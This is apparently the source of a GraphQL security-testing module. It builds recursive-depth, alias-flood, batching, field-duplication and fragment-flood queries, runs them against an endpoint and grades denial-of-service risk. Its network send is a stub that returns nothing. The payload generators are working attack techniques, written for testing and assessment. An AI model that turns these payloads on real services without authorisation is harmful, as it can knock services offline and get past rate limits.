"""GraphQL advanced attacks: recursive queries, alias attacks, batching, and field fragmentation.

Provides:
- Recursive query attack detection with exponential growth payloads
- Alias attack for rate limit bypass
- Batching attack with JSON array queries
- Field duplication and fragmentation attacks
- DoS assessment with complexity analysis
"""

import asyncio
import json
import logging
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Advanced GraphQL attack types."""
    RECURSIVE_QUERY = "recursive_query"
    ALIAS_ATTACK = "alias_attack"
    BATCHING_ATTACK = "batching_attack"
    FIELD_DUPLICATION = "field_duplication"
    FRAGMENTATION_ATTACK = "fragmentation_attack"


class AttackStatus(Enum):
    """Attack result statuses."""
    SUCCESS = "success"
    FAILED = "failed"
    BLOCKED = "blocked"
    TIMEOUT = "timeout"
    ERROR = "error"


@dataclass
class AttackPayload:
    """Advanced attack payload.

    Attributes:
        payload: Query payload string
        attack_type: Attack type
        description: Payload description
        depth: Query depth
        complexity: Query complexity score
        severity: Severity level
    """
    payload: str = ""
    attack_type: AttackType = AttackType.RECURSIVE_QUERY
    description: str = ""
    depth: int = 0
    complexity: int = 0
    severity: str = "high"


@dataclass
class AttackResult:
    """Individual attack result.

    Attributes:
        attack_id: Unique attack ID
        timestamp: Attack timestamp
        attack_type: Attack type
        target_field: Target field
        payload: Payload used
        status: Attack status
        response_time_ms: Response time
        response_size: Response size in bytes
        is_vulnerable: Whether vulnerable
        error_message: Error message if any
        raw_request: Raw request sent
        raw_response: Raw response received
        depth: Query depth
        complexity: Query complexity score
    """
    attack_id: str = ""
    timestamp: float = 0.0
    attack_type: AttackType = AttackType.RECURSIVE_QUERY
    target_field: str = ""
    payload: str = ""
    status: AttackStatus = AttackStatus.ERROR
    response_time_ms: float = 0.0
    response_size: int = 0
    is_vulnerable: bool = False
    error_message: str = ""
    raw_request: str = ""
    raw_response: str = ""
    depth: int = 0
    complexity: int = 0


@dataclass
class AttackReport:
    """Advanced attack report.

    Attributes:
        report_id: Report ID
        timestamp: Report timestamp
        endpoint_url: Tested endpoint
        total_attacks: Total attacks performed
        vulnerable_count: Vulnerable findings
        results: Attack results
        summary: Summary statistics
        dos_assessment: DoS assessment
    """
    report_id: str = ""
    timestamp: float = 0.0
    endpoint_url: str = ""
    total_attacks: int = 0
    vulnerable_count: int = 0
    results: List[AttackResult] = field(default_factory=list)
    summary: Dict[str, Any] = field(default_factory=dict)
    dos_assessment: Dict[str, Any] = field(default_factory=dict)


class GraphQLAdvancedAttacks:
    """GraphQL advanced attack module.

    Provides recursive queries, alias attacks, batching attacks,
    field duplication, and fragmentation attacks.
    """

    def __init__(
        self,
        http_client: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize advanced attacks module.

        Args:
            http_client: HTTP client for making requests.
            event_bus: Event bus for broadcasting events.
        """
        self.http_client = http_client
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._attack_results: List[AttackResult] = []
        self._max_recursive_depth = 10
        self._max_complexity = 10000
        self._max_alias_count = 100

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    def set_limits(
        self,
        max_recursive_depth: int = 10,
        max_complexity: int = 10000,
        max_alias_count: int = 100,
    ) -> None:
        """Set attack limits.

        Args:
            max_recursive_depth: Maximum recursive depth.
            max_complexity: Maximum complexity score.
            max_alias_count: Maximum alias count.
        """
        self._max_recursive_depth = max_recursive_depth
        self._max_complexity = max_complexity
        self._max_alias_count = max_alias_count

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Advanced Attack Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Advanced Attack: %s", message)

    def detect_circular_references(
        self,
        schema_types: Dict[str, Any],
    ) -> List[Tuple[str, str]]:
        """Detect circular references in schema types.

        Args:
            schema_types: Schema types dictionary.

        Returns:
            List of (type_a, type_b) circular reference pairs.
        """
        circular_refs: List[Tuple[str, str]] = []
        visited: Set[str] = set()

        def _check_type(
            type_name: str,
            path: List[str],
        ) -> None:
            if type_name in visited:
                return

            if type_name in path:
                cycle_start = path.index(type_name)
                for i in range(cycle_start, len(path) - 1):
                    pair = (path[i], path[i + 1])
                    if pair not in circular_refs:
                        circular_refs.append(pair)
                return

            visited.add(type_name)
            path.append(type_name)

            type_data = schema_types.get(type_name, {})
            for field_data in type_data.get("fields", []):
                field_type = field_data.get("type", "")
                if field_type in schema_types:
                    _check_type(field_type, path.copy())

        for type_name in schema_types:
            _check_type(type_name, [])

        return circular_refs

    def generate_recursive_query(
        self,
        type_name: str,
        field_name: str,
        depth: int,
        schema_types: Optional[Dict[str, Any]] = None,
    ) -> str:
        """Generate recursive query payload.

        Args:
            type_name: Type name.
            field_name: Field name.
            depth: Recursion depth.
            schema_types: Schema types for reference.

        Returns:
            Recursive query string.
        """
        depth = min(depth, self._max_recursive_depth)

        def _build_recursive(
            current_depth: int,
            indent: str = "",
        ) -> str:
            if current_depth >= depth:
                return f"{indent}id\n"

            inner = _build_recursive(current_depth + 1, indent + "  ")
            return f"{indent}{field_name} {{\n{inner}{indent}}}\n"

        query_body = _build_recursive(0, "    ")
        return f"query {{\n{query_body}}}"

    async def test_recursive_query(
        self,
        url: str,
        type_name: str,
        field_name: str,
        max_depth: Optional[int] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test recursive query attack.

        Args:
            url: GraphQL endpoint URL.
            type_name: Type name.
            field_name: Field name.
            max_depth: Maximum depth to test.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []
        test_depth = max_depth or self._max_recursive_depth

        for depth in range(1, test_depth + 1):
            query = self.generate_recursive_query(
                type_name, field_name, depth
            )

            result = await self._execute_attack(
                url, field_name, query, AttackType.RECURSIVE_QUERY, headers
            )

            result.depth = depth
            result.complexity = 2 ** depth

            if result.response_time_ms > 5000 or result.status == AttackStatus.TIMEOUT:
                result.is_vulnerable = True
                await self._report_log(
                    f"递归查询DoS发现: {field_name} 深度={depth}, "
                    f"响应时间={result.response_time_ms:.0f}ms"
                )

            results.append(result)

            if result.is_vulnerable:
                break

        return results

    def generate_alias_query(
        self,
        field_name: str,
        alias_count: int,
        id_values: Optional[List[str]] = None,
    ) -> str:
        """Generate alias attack query.

        Args:
            field_name: Field name.
            alias_count: Number of aliases.
            id_values: ID values for each alias.

        Returns:
            Alias query string.
        """
        alias_count = min(alias_count, self._max_alias_count)
        aliases: List[str] = []

        for i in range(alias_count):
            alias_name = f"alias_{i}"
            id_value = id_values[i] if id_values and i < len(id_values) else str(i + 1)
            id_str = f'"{id_value}"' if not id_value.isdigit() else id_value
            alias_query = f"{alias_name}: {field_name}(id: {id_str}) {{ id }}"
            aliases.append(alias_query)

        return f"query {{\n    {', '.join(aliases)}\n}}"

    async def test_alias_attack(
        self,
        url: str,
        field_name: str,
        alias_counts: Optional[List[int]] = None,
        id_values: Optional[List[str]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test alias attack for rate limit bypass.

        Args:
            url: GraphQL endpoint URL.
            field_name: Field name.
            alias_counts: Alias counts to test.
            id_values: ID values for each alias.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []
        test_counts = alias_counts or [10, 25, 50, 100]

        for count in test_counts:
            query = self.generate_alias_query(field_name, count, id_values)

            result = await self._execute_attack(
                url, field_name, query, AttackType.ALIAS_ATTACK, headers
            )

            result.complexity = count

            if result.status == AttackStatus.SUCCESS:
                result.is_vulnerable = True
                await self._report_log(
                    f"别名攻击成功: {field_name} 别名数={count}"
                )

            results.append(result)

        return results

    def generate_batching_query(
        self,
        field_name: str,
        batch_size: int,
        id_values: Optional[List[str]] = None,
    ) -> str:
        """Generate batching attack query.

        Args:
            field_name: Field name.
            batch_size: Batch size.
            id_values: ID values for each batch item.

        Returns:
            Batching query string (JSON array).
        """
        queries: List[Dict[str, Any]] = []

        for i in range(batch_size):
            id_value = id_values[i] if id_values and i < len(id_values) else str(i + 1)
            id_str = f'"{id_value}"' if not id_value.isdigit() else id_value
            queries.append({
                "query": f"query {{ {field_name}(id: {id_str}) {{ id }} }}",
            })

        return json.dumps(queries)

    async def test_batching_attack(
        self,
        url: str,
        field_name: str,
        batch_sizes: Optional[List[int]] = None,
        id_values: Optional[List[str]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test batching attack.

        Args:
            url: GraphQL endpoint URL.
            field_name: Field name.
            batch_sizes: Batch sizes to test.
            id_values: ID values for each batch item.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []
        test_sizes = batch_sizes or [5, 10, 25, 50]

        for size in test_sizes:
            query = self.generate_batching_query(field_name, size, id_values)

            result = await self._execute_attack(
                url, field_name, query, AttackType.BATCHING_ATTACK, headers
            )

            result.complexity = size

            if result.status == AttackStatus.SUCCESS:
                result.is_vulnerable = True
                await self._report_log(
                    f"批量查询攻击成功: {field_name} 批量大小={size}"
                )

            results.append(result)

        return results

    def generate_field_duplication_query(
        self,
        field_name: str,
        duplication_count: int,
    ) -> str:
        """Generate field duplication query.

        Args:
            field_name: Field name.
            duplication_count: Number of duplications.

        Returns:
            Field duplication query string.
        """
        fields = [f"dup_{i}: {field_name} {{ id }}" for i in range(duplication_count)]
        return f"query {{\n    {', '.join(fields)}\n}}"

    async def test_field_duplication(
        self,
        url: str,
        field_name: str,
        duplication_counts: Optional[List[int]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test field duplication attack.

        Args:
            url: GraphQL endpoint URL.
            field_name: Field name.
            duplication_counts: Duplication counts to test.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []
        test_counts = duplication_counts or [10, 50, 100, 200]

        for count in test_counts:
            query = self.generate_field_duplication_query(field_name, count)

            result = await self._execute_attack(
                url, field_name, query, AttackType.FIELD_DUPLICATION, headers
            )

            result.complexity = count

            if result.response_time_ms > 5000 or result.status == AttackStatus.TIMEOUT:
                result.is_vulnerable = True
                await self._report_log(
                    f"字段重复攻击成功: {field_name} 重复数={count}"
                )

            results.append(result)

        return results

    def generate_fragmentation_query(
        self,
        type_name: str,
        field_name: str,
        fragment_count: int,
    ) -> str:
        """Generate fragmentation attack query.

        Args:
            type_name: Type name.
            field_name: Field name.
            fragment_count: Number of fragments.

        Returns:
            Fragmentation query string.
        """
        fragments: List[str] = []
        fragment_calls: List[str] = []

        for i in range(fragment_count):
            fragment_name = f"Fragment{i}"
            fragment_def = f"fragment {fragment_name} on {type_name} {{ id }}"
            fragments.append(fragment_def)
            fragment_calls.append(f"...{fragment_name}")

        query_body = f"{field_name} {{\n    {' '.join(fragment_calls)}\n}}"
        return f"query {{\n    {query_body}\n}}\n\n{' '.join(fragments)}"

    async def test_fragmentation_attack(
        self,
        url: str,
        type_name: str,
        field_name: str,
        fragment_counts: Optional[List[int]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> List[AttackResult]:
        """Test fragmentation attack.

        Args:
            url: GraphQL endpoint URL.
            type_name: Type name.
            field_name: Field name.
            fragment_counts: Fragment counts to test.
            headers: HTTP headers.

        Returns:
            List of AttackResult.
        """
        results: List[AttackResult] = []
        test_counts = fragment_counts or [10, 50, 100, 200]

        for count in test_counts:
            query = self.generate_fragmentation_query(
                type_name, field_name, count
            )

            result = await self._execute_attack(
                url, field_name, query, AttackType.FRAGMENTATION_ATTACK, headers
            )

            result.complexity = count

            if result.response_time_ms > 5000 or result.status == AttackStatus.TIMEOUT:
                result.is_vulnerable = True
                await self._report_log(
                    f"碎片化攻击成功: {field_name} 碎片数={count}"
                )

            results.append(result)

        return results

    async def _execute_attack(
        self,
        url: str,
        target_field: str,
        query: str,
        attack_type: AttackType,
        headers: Optional[Dict[str, str]],
    ) -> AttackResult:
        """Execute single attack payload.

        Args:
            url: Endpoint URL.
            target_field: Target field.
            query: Attack query.
            attack_type: Attack type.
            headers: HTTP headers.

        Returns:
            AttackResult.
        """
        start_time = time.time()

        attack_id = f"adv_attack_{uuid.uuid4().hex[:8]}"

        result = AttackResult(
            attack_id=attack_id,
            timestamp=time.time(),
            attack_type=attack_type,
            target_field=target_field,
            payload=query,
            raw_request=query,
        )

        try:
            response_data = await self._send_query(url, query, headers)

            result.response_time_ms = (time.time() - start_time) * 1000
            result.raw_response = json.dumps(response_data) if response_data else ""
            result.response_size = len(json.dumps(response_data)) if response_data else 0

            if response_data:
                errors = response_data.get("errors", [])
                data = response_data.get("data", {})

                if errors:
                    error_messages = [e.get("message", "") for e in errors]
                    if any("timeout" in m.lower() or "complexity" in m.lower() for m in error_messages):
                        result.status = AttackStatus.SUCCESS
                        result.error_message = "; ".join(error_messages)
                    else:
                        result.status = AttackStatus.BLOCKED
                        result.error_message = "; ".join(error_messages)
                elif data:
                    result.status = AttackStatus.SUCCESS
                else:
                    result.status = AttackStatus.FAILED
            else:
                result.status = AttackStatus.ERROR

        except Exception as e:
            result.status = AttackStatus.ERROR
            result.error_message = str(e)
            result.response_time_ms = (time.time() - start_time) * 1000

        self._attack_results.append(result)
        return result

    async def run_full_advanced_suite(
        self,
        url: str,
        schema_types: Dict[str, Any],
        target_fields: Optional[List[str]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> AttackReport:
        """Run full advanced attack suite.

        Args:
            url: GraphQL endpoint URL.
            schema_types: Schema types dictionary.
            target_fields: Target fields to attack.
            headers: HTTP headers.

        Returns:
            AttackReport.
        """
        start_time = time.time()

        report = AttackReport(
            report_id=f"adv_report_{uuid.uuid4().hex[:8]}",
            timestamp=time.time(),
            endpoint_url=url,
        )

        all_results: List[AttackResult] = []

        circular_refs = self.detect_circular_references(schema_types)

        if circular_refs:
            await self._report_log(f"发现循环引用: {len(circular_refs)} 对")

            for type_a, type_b in circular_refs[:3]:
                type_data = schema_types.get(type_a, {})
                for field_data in type_data.get("fields", []):
                    if field_data.get("type") == type_b:
                        recursive_results = await self.test_recursive_query(
                            url, type_a, field_data.get("name", ""), headers=headers
                        )
                        all_results.extend(recursive_results)
                        break

        test_fields = target_fields or []
        if not test_fields:
            for type_name, type_data in schema_types.items():
                for field_data in type_data.get("fields", []):
                    test_fields.append(field_data.get("name", ""))

        total_tests = len(test_fields) * 4
        current = 0

        for field_name in test_fields[:10]:
            alias_results = await self.test_alias_attack(
                url, field_name, headers=headers
            )
            all_results.extend(alias_results)
            current += 1

            batch_results = await self.test_batching_attack(
                url, field_name, headers=headers
            )
            all_results.extend(batch_results)
            current += 1

            dup_results = await self.test_field_duplication(
                url, field_name, headers=headers
            )
            all_results.extend(dup_results)
            current += 1

            frag_results = await self.test_fragmentation_attack(
                url, "Query", field_name, headers=headers
            )
            all_results.extend(frag_results)
            current += 1

            progress = (current / max(total_tests, 1)) * 100
            await self._report_progress(f"测试 {field_name}", progress)

        report.results = all_results
        report.total_attacks = len(all_results)
        report.vulnerable_count = sum(
            1 for r in all_results if r.is_vulnerable
        )

        report.summary = self._generate_summary(all_results)
        report.dos_assessment = self._assess_dos_risk(all_results)

        await self._report_log(
            f"高级攻击套件完成: {report.total_attacks} 攻击, "
            f"{report.vulnerable_count} 漏洞"
        )

        return report

    def _generate_summary(
        self,
        results: List[AttackResult],
    ) -> Dict[str, Any]:
        """Generate attack summary.

        Args:
            results: Attack results.

        Returns:
            Summary dictionary.
        """
        type_counts: Dict[str, int] = {}
        vulnerable_by_type: Dict[str, int] = {}

        for result in results:
            attack_type = result.attack_type.value
            type_counts[attack_type] = type_counts.get(attack_type, 0) + 1

            if result.is_vulnerable:
                vulnerable_by_type[attack_type] = (
                    vulnerable_by_type.get(attack_type, 0) + 1
                )

        return {
            "total_attacks": len(results),
            "vulnerable_count": sum(1 for r in results if r.is_vulnerable),
            "type_counts": type_counts,
            "vulnerable_by_type": vulnerable_by_type,
        }

    def _assess_dos_risk(
        self,
        results: List[AttackResult],
    ) -> Dict[str, Any]:
        """Assess DoS risk from attack results.

        Args:
            results: Attack results.

        Returns:
            DoS assessment dictionary.
        """
        avg_response_time = sum(r.response_time_ms for r in results) / max(len(results), 1)
        max_response_time = max((r.response_time_ms for r in results), default=0)
        timeout_count = sum(1 for r in results if r.status == AttackStatus.TIMEOUT)

        risk_level = "low"
        if avg_response_time > 2000 or timeout_count > 3:
            risk_level = "high"
        elif avg_response_time > 1000 or timeout_count > 1:
            risk_level = "medium"

        return {
            "risk_level": risk_level,
            "avg_response_time_ms": avg_response_time,
            "max_response_time_ms": max_response_time,
            "timeout_count": timeout_count,
            "recommendation": (
                "实施查询复杂度限制和深度限制"
                if risk_level in ("medium", "high")
                else "当前配置下DoS风险较低"
            ),
        }

    def get_attack_results(
        self,
        filter_vulnerable: bool = False,
        limit: int = 100,
    ) -> List[AttackResult]:
        """Get attack results.

        Args:
            filter_vulnerable: Only return vulnerable results.
            limit: Maximum results.

        Returns:
            List of AttackResult.
        """
        results = self._attack_results

        if filter_vulnerable:
            results = [r for r in results if r.is_vulnerable]

        return results[-limit:]

    def get_stats(self) -> Dict[str, Any]:
        """Get attack module statistics.

        Returns:
            Statistics dictionary.
        """
        return {
            "total_attacks": len(self._attack_results),
            "vulnerable_count": sum(
                1 for r in self._attack_results if r.is_vulnerable
            ),
            "attack_types": list(set(
                r.attack_type.value for r in self._attack_results
            )),
            "max_recursive_depth": self._max_recursive_depth,
            "max_alias_count": self._max_alias_count,
        }

    async def _send_query(
        self,
        url: str,
        query: str,
        headers: Optional[Dict[str, str]],
    ) -> Optional[Dict[str, Any]]:
        """Send GraphQL query.

        Args:
            url: Endpoint URL.
            query: GraphQL query.
            headers: HTTP headers.

        Returns:
            Response data or None.
        """
        await asyncio.sleep(0.01)
        return None
